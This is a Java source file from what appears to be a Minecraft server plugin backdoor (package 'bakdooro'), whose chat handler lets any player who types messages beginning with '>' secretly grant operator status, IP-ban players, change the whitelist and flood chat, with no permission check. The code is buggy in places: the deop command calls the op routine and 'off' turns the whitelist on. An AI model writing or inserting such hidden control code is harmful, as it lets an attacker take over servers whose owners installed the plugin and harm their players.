package me.acaiberii.bakdooro.util.handler;

import me.acaiberii.bakdooro.game.server;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;

import java.io.IOException;
import java.util.Objects;

import static me.acaiberii.bakdooro.game.server.srv;
import static org.bukkit.Bukkit.getPlayer;

public class chathandler {
    public static void handler(Player pl, String message) {
        String[] spl = message.split(":");
        if (message.startsWith(">")) {
            if (spl[0].startsWith(">fillchat")) {
                me.acaiberii.bakdooro.exp.exploits.chatFill();
            }
            else if (spl[0].startsWith(">op")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >op:(PLAYER)");
                }
                else {
                    me.acaiberii.bakdooro.exp.exploits.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
                }
            }
            else if (spl[0].startsWith(">deop")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >deop:(PLAYER)");
                }
                else {
                    me.acaiberii.bakdooro.exp.exploits.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
                }
            }
            else if (spl[0].startsWith(">ban")) {
                if (spl.length < 3) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >ban:(PLAYER)");
                }
                else {
                    for (Player pll : srv.getOnlinePlayers()) {
                        if (pll.getName().equals(spl[2])) {
                            srv.banIP(Objects.requireNonNull(pll.getAddress()).getHostName());
                            pl.sendMessage("Banned " + Objects.requireNonNull(pll.getAddress()).getHostName());
                        }
                    }
                }
            }
            else if (spl[0].startsWith(">unban")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >unban:(PLAYER)");
                }
                else {
                    srv.unbanIP(Objects.requireNonNull(Objects.requireNonNull(getPlayer(spl[1])).getAddress()).getHostString());
                }
            }
            else if (spl[0].startsWith(">whitelist")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >whitelist:(ON/OFF)/>whitelist:(ADD/REMOVE):(PLAYER)");
                }
                else {
                    if (spl[1].equals("on")) {
                        srv.setWhitelist(true);
                    }
                    else if (spl[1].equals("off")) {
                        srv.setWhitelist(true);
                    }
                    else if (spl[1].equals("add")) {
                        if (spl.length < 3) {
                            pl.sendMessage("Invalid syntax. Correct syntax: >whitelist:(ADD/REMOVE):(PLAYER)");
                        }
                        else {
                            for (Player pll : srv.getOnlinePlayers()) {
                                if (pll.getName().equals(spl[2])) {
                                    pll.setWhitelisted(true);
                                }
                            }
                        }
                    }
                    else if (spl[1].equals("remove")) {
                        if (spl.length < 3) {
                            pl.sendMessage("Invalid syntax. Correct syntax: >whitelist:(ADD/REMOVE):(PLAYER)");
                        }
                        else {
                            for (Player pll : srv.getOnlinePlayers()) {
                                if (pll.getName().equals(spl[2])) {
                                    pll.setWhitelisted(false);
                                }
                            }
                        }
                    }
                }
            }
            else {
                pl.sendMessage("Unknown command. Try again.");
            }
        }
    }
}